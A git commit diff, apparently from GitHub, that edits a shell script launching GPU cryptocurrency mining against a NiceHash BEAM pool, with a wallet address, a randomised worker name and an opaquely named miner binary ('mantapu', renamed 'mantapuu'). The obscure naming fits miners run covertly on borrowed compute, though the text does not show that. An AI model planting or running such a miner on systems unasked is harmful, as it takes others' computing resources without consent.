0a0bb22ff858217528602179364528ee44f5a27b
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2021-08-26 21:28:35 +0700

    Update gpu-nvidia.sh

--- gpu-nvidia.sh
+++ gpu-nvidia.sh
@@ -2,5 +2,5 @@
 POOL=stratum+tcp://beamv3.eu-west.nicehash.com:3387
 WALLET=36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.xrocBEAM
 WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
-chmod +x mantapu
-./mantapu --algo BEAM-III --pool $POOL --user $WALLET.$WORKER
+chmod +x mantapuu
+./mantapuu --algo BEAM-III --pool $POOL --user $WALLET.$WORKER
